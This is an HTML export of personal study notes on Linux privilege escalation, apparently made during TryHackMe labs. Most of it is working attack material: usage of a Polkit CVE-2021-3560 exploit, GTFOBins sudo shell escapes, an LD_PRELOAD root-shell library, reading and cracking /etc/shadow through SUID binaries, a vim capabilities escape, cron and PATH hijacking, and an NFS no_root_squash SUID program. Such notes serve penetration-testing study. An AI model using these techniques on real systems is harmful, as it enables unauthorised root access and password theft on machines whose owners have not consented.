<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux</h1><br/><strong>Linux Preveledge Escalation</strong><br /><br /><a href="https://github.com/CybeXRay/CVE-2021-3560-Polkit-Privilege-Esclation">https://github.com/CybeXRay/CVE-2021-3560-Polkit-Privilege-Esclation</a><br /><br />• This exploit works only on distributions that have installed <code>accountsservice</code> and <code>gnome-control-center</code> and it must have <code>polkit</code> version 0.113 (or later) OR <code>0-105-26</code> (Debian fork of <code>polkit</code>).<br /><br />As this is a timing based exploit, it might be required to run multple times. (I got in 7-8th time)<br /><br />It creates a sudo user (default-secnigma) with the password we provide. Then just su into this user &amp; run sudo bash to get into root.<br /><br />./poc.sh -p=12345<br /><br />Or if we want custom username:<br /><br />./poc.sh -u=cybexray -p=12345<br /><br /><br /><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a><br /><br />pspy can be used to list/view all processes using a non-root account. This can be helpful to find misconfigurations<br /><br /><br />Upload to victim machine as normal user and run it<br />./pspy64s<br /><br /><br /><strong>THM:</strong><br /><br /><a href="https://camo.githubusercontent.com/eda971feea35d0dbda6e982c6132d0bff82c438482774d98c0d15eafa625813f/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067"><img src="images/65-1.png" alt="images/65-1.png" /></a><br /><br /><br /><strong>Local Prevelege Escalation Guide/Walkthrough for Windows/Linux in PDF:</strong><br />https://github.com/sagishahar/lpeworkshop<br /><br /><strong>Key Commands:</strong><br />hostname<br />uname -a<br />lsb_release -a<br />cat /proc/version<br />cat /etc/issue<br />cat /etc/passwd<br />history<br />ifconfig<br />ip route 			:	To see which network routes exists<br />ps<br />netstat<br />find<br /><br /><strong>Automated Enumeration Tools:</strong><br />• <strong>LinPeas</strong>: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<br />• <strong>LinEnum: </strong>https://github.com/rebootuser/LinEnum<br />• <strong>LES (Linux Exploit Suggester): </strong>https://github.com/mzet-/linux-exploit-suggester<br />• <strong>Linux Smart Enumeration: </strong>https://github.com/diego-treitos/linux-smart-enumeration<br />• <strong>Linux Priv Checker:</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a><br /><br /><strong>To Have Prevelge Escalation from sudo allowed programs:</strong><br /><strong>https://gtfobins.github.io</strong><br /><br />FIND<br />sudo find . -exec /bin/sh \; -quit<br />LESS<br />sudo less /etc/profile<br />!/bin/sh<br />NANO<br />sudo nano<br />^R^X<br />reset; sh 1&gt;&amp;0 2&gt;&amp;0<br />NMAP<br />sudo nmap --interactive<br />nmap&gt; !sh<br /><br /><br /><strong>Using LD_PRELOAD in sudo file:</strong><br /><br />LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the &quot;env_keep&quot; option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.<br /><br />The steps of this privilege escalation vector can be summarized as follows;<br /><br />    -Check for LD_PRELOAD (with the env_keep option)<br />    -Write a simple C code compiled as a share object (.so extension) file<br />    -Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file<br /><br /><img src="images/65-2.png" alt="images/65-2.png" /><br /><br /><br /><br />The C code will simply spawn a root shell and can be written as follows;<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />void _init() {<br />unsetenv(&quot;LD_PRELOAD&quot;);<br />setgid(0);<br />setuid(0);<br />system(&quot;/bin/bash&quot;);<br />}<br /><br />We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;<br /><br />gcc -fPIC -shared -o shell.so shell.c -nostartfiles<br /><br />We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.<br /><br />We need to run the program by specifying the LD_PRELOAD option, as follows;<br /><br />sudo LD_PRELOAD=/home/user/ldpreload/shell.so find<br /><br /><br /><strong>Using SUID:</strong><br /><br />find / -type f -perm -04000 -ls 2&gt;/dev/null  will list files that have SUID or SGID bits set.<br /><br />Then check GTFOBins for vulnerable binaries that are allowed SUID.<br /><br />Eg.<br />If nano has SUID set. We can access /etc/passwd and /etc/shadow as root<br /><br />Get the passwd and shadow files.<br />unshadow passwd.txt shadow.txt &gt; passwords.txt<br />Now use John with a good wordlist to crack the passwords.txt<br /><br />OR<br /><br />Add a new user.<br />openssl passwd  -1 -salt THM Password1 				---&gt;		It will create a password<br />We will then add this password with a username to the /etc/passwd file.<br />Copy the root details. See below<br /><br /><img src="images/65-3.png" alt="images/65-3.png" /><br /><br /><strong>If base64 has suid set</strong><br /><br />base64 /etc/passwd | base64 --decode<br />base64 /etc/shadow | base64 --decode<br /><br />Copy the required accounts contents to local machine with name password.txt and shadow.txt<br /><br />unshadow password.txt shadow.txt &gt; crackMe.txt<br /><br />Then crack it<br />john --wordlist=/usr/share/wordlists/rockyou.txt crackMe.txt<br /><br /><br /><strong>Using Capabilities:</strong><br /><br />Capabilities are used to give granular preveleges to binary and processes.<br />man capabilites   -→ More Info<br /><br />getcap -r / 		:		Tool to list enabled capabilites. <br /><br />getcap -r / 2&gt;/dev/null		:  	As a non preveleged user it gives a lot of error. Thus we add 2&gt;/dev/null to see only the output<br /><br />eg.<br /><img src="images/65-4.png" alt="images/65-4.png" /><br /><br />For example: vim has capabilities of setuid.<br />Note: If we list vim binary, we can&#39;t see any differnece.<br /><br /><img src="images/65-5.png" alt="images/65-5.png" /><br /><br />Now, we can use vim from GTFOBin capabilities section<br />./vim -c &#39;:py3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;<br /><br />Note: py3 → python3 or py → python or py2 → python2<br />Note: view can be used using the same way as it is also having setuid capability<br /><br />./view -c &#39;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;<br /><br /><br /><strong>Using Cron Jobs:</strong><br /><br />Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.<br />Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.<br /><br />Any user can read the file keeping system-wide cron jobs under /etc/crontab<br /><br />If we find any root user scripts that we can access and modify, we can add a reverse shell and it will be run as root.<br /><br />Note: Sometimes /etc/crontab will have scripts which are already deleted. These can be exploited if full path is not mentioned.<br />Croon job will look for the script in the PATH mentioned in /etc/crontab<br /><br /><strong>Using PATH:</strong><br />Consider a program:<br />#include&lt;unistd.h&gt;<br />void main()<br />{<br />        setuid(0);<br />        setgid(0);<br />        system(&quot;thm&quot;);<br />}<br /><br />Created by root &amp; SETUID bit is set. Thus this program can be run by anyone as root.<br />Now we need to create a file named thm and have /bin/bash in it.<br /><br />echo “/bin/bash” &gt; thm<br /><br />Now add the location (say /tmp) of thm to PATH.<br /><br />export PATH=/tmp:PATH<br />now run the program with suid bit. We will have root bash.<br /><br /><strong>Using NFS:</strong><br />To view all Network File Sharing (NFS) configurations.<br />cat /etc/exports<br />eg.<br /><img src="images/65-6.png" alt="images/65-6.png" /><br /><br /><br />The critical element for this privilege escalation vector is the “<strong>no_root_squash</strong>” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.<br /><br /><br />To view network shares from attacker machine:<br />showmount -e &lt;Target IP&gt;<br />eg.<br /><img src="images/65-7.png" alt="images/65-7.png" /><br /><br />Mount the share with (&quot;no_root_squash&quot;) enabled<br /><br />mkdir /tmp/backup_on_attacker_machine<br />mount -o rw 10.10.78.5:/home/backup /tmp/backup_on_attacker_machine<br /><br />Create a program in the share:<br />#include&lt;unistd.h&gt;<br />int main()<br />{<br />        setuid(0);<br />        setgid(0);<br />        system(&quot;/bin/bash&quot;);<br />}<br /><br />Compile it and SETUID bit on it to be run by root.<br /><br />gcc nfs_exploit.c -o nfs_exploit -w						[-w: for supress warnings]<br />chmod +s nfs_exploit<br /><br />Now run the program in the target machine. We will have root access.<br /><br /><br /></div>
</body>
</html>
